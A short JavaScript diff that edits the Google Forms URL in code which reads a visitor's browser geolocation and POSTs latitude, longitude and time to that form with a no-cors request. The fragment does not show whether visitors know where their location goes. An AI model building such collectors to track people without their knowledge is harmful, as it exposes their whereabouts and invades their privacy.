@@ -11,7 +11,7 @@ navigator.geolocation.getCurrentPosition(function(pos){
   data.append("entry.222222", pos.coords.longitude);
   data.append("entry.333333", new Date().toLocaleString());
 
-  fetch("https://docs.google.com/forms/d/e/1FAIpQLSfe-VBAXa8RRk6o1eWfB2IdQW0h3NLGhruyUGKX3BnzU0N5tg/formResponse", {
+  fetch("https://docs.google.com/forms/d/1FAIpQLSfe-VBAXa8RRk6o1eWfB2IdQW0h3NLGhruyUGKX3BnzU0N5tg/formResponse", {
     method: "POST",
     mode: "no-cors",
     body: data
